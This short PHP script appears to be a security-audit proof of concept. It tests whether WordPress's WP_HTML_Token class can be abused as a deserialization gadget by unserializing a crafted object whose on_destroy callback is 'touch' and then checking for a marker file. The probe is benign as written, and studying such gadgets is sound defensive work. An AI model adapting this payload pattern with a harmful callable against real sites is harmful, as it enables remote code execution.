<?php
error_reporting(E_ALL & ~E_DEPRECATED);
require '/home/user/wpaudit/wordpress/wp-includes/html-api/class-wp-html-token.php';
$marker = '/home/user/wpaudit/GADGET_FIRED';
@unlink($marker);
// Craft payload: WP_HTML_Token with on_destroy=callable, bookmark_name=arg.
// Simulate what an attacker's serialized blob would deserialize to.
$payload = 'O:13:"WP_HTML_Token":2:{s:13:"bookmark_name";s:'.strlen($marker).':"'.$marker.'";s:10:"on_destroy";s:5:"touch";}';
echo "payload: $payload\n";
try {
  $o = unserialize($payload);
  echo "unserialize returned: ".var_export($o,true)."\n";
} catch (\Throwable $e) {
  echo "unserialize threw: ".get_class($e).': '.$e->getMessage()."\n";
}
// Force GC / end of scope.
unset($o);
gc_collect_cycles();
clearstatcache();
echo "GADGET_FIRED exists: ".(file_exists($marker)?'*** YES - DESTRUCT RAN call_user_func ***':'no (guard held)')."\n";
@unlink($marker);
